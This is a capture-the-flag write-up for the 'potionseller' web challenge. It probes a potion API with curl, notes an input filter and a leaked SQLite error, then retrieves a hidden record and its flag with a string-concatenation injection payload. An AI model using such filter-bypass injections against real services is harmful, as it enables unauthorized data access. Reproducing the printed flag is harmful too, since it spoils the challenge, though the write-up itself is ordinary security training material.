# potionseller

## What it is

A website that displays potions, it is a reference to a meme ([source](https://knowyourmeme.com/memes/potion-seller)).

We can get the potions in json at ```/potions```.
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions
{
  "potions": [
    {
      "id": 0,
      "name": "Health Potion",
      "description": "A boost of health for trying times",
      "img": "https://static.turbosquid.com/Preview/001318/811/G1/_D.jpg",
      "price": 20
    },
    {
      "id": 1,
      "name": "Stamina Potion",
      "description": "That potion literally no one ever uses",
      "img": "https://static.turbosquid.com/Preview/2014/07/08__08_31_26/01.jpg1ba8860a-4b96-48a4-b8a2-ae33c533a8a8Large.jpg",
      "price": 10
    },
    {
      "id": 2,
      "name": "Resurrection Potion",
      "description": "When god fails you, this is the next best thing",
      "img": "https://i.pinimg.com/originals/d7/ac/3c/d7ac3cccb65c2dd43cf6b733e02405d0.jpg",
      "price": 100
    },
    {
      "id": 3,
      "name": "Love Potion",
      "description": "Success not guaranteed if you are a goblin",
      "img": "http://wiccanspells.info/wp-content/uploads/2015/10/love-potion-tincture.jpg",
      "price": 2000
    },
    {
      "id": 4,
      "name": "My Strongest Potion",
      "description": "This potion will kill a dragon - let alone a man!",
      "img": "https://78.media.tumblr.com/5e7b833f6932170b688ad73fbfdfd862/tumblr_mwgbvlkRdo1stqkamo1_500.jpg",
      "price": 100000000
    },
    {
      "id": 5,
      "name": "Truth Serum (6x)",
      "description": "Perfect for questing adventurers or for wild parties!",
      "img": "http://payload138.cargocollective.com/1/3/107627/5077854/TruthSerum_jpeg_02_800.jpg",
      "price": 600
    }
  ]
}
```

We can get a specific potion at ```/potions/{potion id}```, for example:
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/1
{
  "potion": {
    "id": 1,
    "name": "Stamina Potion",
    "description": "That potion literally no one ever uses",
    "price": 10,
    "img": "https://static.turbosquid.com/Preview/2014/07/08__08_31_26/01.jpg1ba8860a-4b96-48a4-b8a2-ae33c533a8a8Large.jpg",
    "longdescription": "Are you tired after running after that pesky thief, or after climbing a huge mountain only to find a Korok seed at the top? Fear not - this Stamina potion will have you on your feet in no time! Can also replace a solid coffee in the morning!"
  }
}
```

We can't get the strongest potion (potion 4) that way:
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/4
{
  "err": "That potion is too strong for you, traveller!"
}
```

Trying to put some characters instead of a number will result in an error:
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/\=
{
  "err": "That looks like code! I don't like code, only potions!"
}
```
"code" chars: '=', ';', ':', '{', '}', '[', ']', '(', ')', '!'

Trying to make 4 with operations can be detected:
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/1+3
{
  "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
}
```
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/2\*2
{
  "err": "Nice try, but that operation adds up to 4! I'm telling you, this potion is too strong!"
}
```

Other interesting results:
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/dragon
{
  "err": "There was an error querying the SQLite database: Error: SQLITE_ERROR: no such column: dragon"
}
```
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/id
{
  "potion": {
    "id": 0,
    "name": "Health Potion",
    "description": "A boost of health for trying times",
    "price": 20,
    "img": "https://static.turbosquid.com/Preview/001318/811/G1/_D.jpg",
    "longdescription": "Are you in a bit of a pickle? Did a giant troll just bash your head in with a large tree perhaps? Do not fear - this Health potion is just the thing you need to get back on your feet!"
  }
}
```
```json
$ curl https://potionseller.secu-web.blackfoot.dev/potions/name
{}
```

## Solution

Adding "2"+"2" isn't detected like the operations mentionned above, not sure why:
```json
$ curl 'https://potionseller.secu-web.blackfoot.dev/potions/"2"+"2"'
{
  "potion": {
    "id": 4,
    "name": "My Strongest Potion",
    "description": "This potion will kill a dragon - let alone a man!",
    "price": 100000000,
    "img": "https://78.media.tumblr.com/5e7b833f6932170b688ad73fbfdfd862/tumblr_mwgbvlkRdo1stqkamo1_500.jpg",
    "longdescription": "It's just water with a colorant in it, don't tell anyone! The flag is: BFS{I_n33d_y0uR_5tr0ng3St_p07ion!}"
  }
}
```

flag: ```BFS{I_n33d_y0uR_5tr0ng3St_p07ion!}```
